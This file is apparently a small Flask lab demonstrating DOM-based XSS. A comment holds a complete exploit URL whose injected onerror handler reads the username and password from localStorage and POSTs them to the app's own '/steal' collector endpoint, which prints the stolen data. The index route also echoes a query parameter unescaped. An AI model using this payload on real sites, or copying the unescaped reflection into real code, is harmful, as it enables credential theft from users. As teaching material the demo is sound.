from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def index():
    item = request.args.get("item", "default")

    if item == "default":
        return "hola"
    if request.method == "GET":
        return item

# http://127.0.0.1:5000/dom#2%22%20onerror=%22fetch('http://127.0.0.1:5000/steal',{method:'POST',headers:%20{'Accept':%20'application/json','Content-Type':%20'application/json'},body:JSON.stringify({username:localStorage.getItem('username'),password:localStorage.getItem('password')})}).then(e=%3Ee.json()).then(data=%3Ewindow.alert(JSON.stringify(data)))%22%3E
@app.route("/steal", methods=["POST"])
def steal():
    content = request.json
    if content:
        if request.method == "POST":
            print("Info Stolen!")
            print(content)

            return {"message": "info stolen"}

@app.route("/dom")
def dom():
    """
    exploit: dom based xss
        key factor:
            - look for website using fragments
            - look if the fragments are used to render imgs/tags dynamically 
        scenario:
            hacker takes advantage of social media site using fragments to
            dynamically render the correct imgs on screen
            
            hacker modifies fragment part of url to escape and write custom execution
             - ex: steal user info
    """
    return render_template("dom.html")

if __name__ == "__main__":
    app.run(debug=True)
